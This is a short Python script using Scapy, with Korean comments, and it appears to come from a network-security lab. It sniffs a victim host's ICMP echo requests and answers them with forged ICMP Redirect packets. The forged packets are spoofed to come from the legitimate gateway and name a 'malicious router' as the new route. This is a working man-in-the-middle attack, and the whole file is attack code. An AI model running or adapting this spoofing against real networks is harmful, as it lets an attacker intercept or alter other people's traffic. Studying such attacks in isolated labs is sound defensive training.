#!/usr/bin/env python3
from scapy.all import *

# 공격 대상과 경로 설정
victim = '10.9.0.5'            # Victim의 IP 주소
real_gateway = '10.9.0.11'     # 정상 라우터
fake_gateway = '10.9.0.111'    # 악성 라우터

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:  # ICMP Echo Request 확인
        # Redirect 메시지 생성
        ip = IP(src=real_gateway, dst=victim)
        icmp = ICMP(type=5, code=1)          # ICMP Redirect 메시지
        icmp.gw = fake_gateway               # 악성 라우터를 게이트웨이로 설정
        
        # ICMP Redirect가 유효하도록 내부 IP 패킷 생성
        ip2 = IP(src=victim, dst='192.168.60.5')  # Redirect 대상
        icmp2 = ICMP(type=8, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load                  # 원본 데이터 로드

        # 새 ICMP Redirect 패킷 생성 및 전송
        newpkt = ip2 / icmp2 / data
        send(ip / icmp / newpkt)
        print(f"Redirect packet sent: {ip2.src} -> {ip2.dst}")

# ICMP 트래픽 스니핑 및 패킷 처리
pkt = sniff(
    iface='eth0',                             # 인터페이스 이름
    filter=f'icmp and src host {victim}',    # Victim의 ICMP 트래픽 필터링
    prn=spoof_pkt                            # 스니핑된 패킷 처리
)
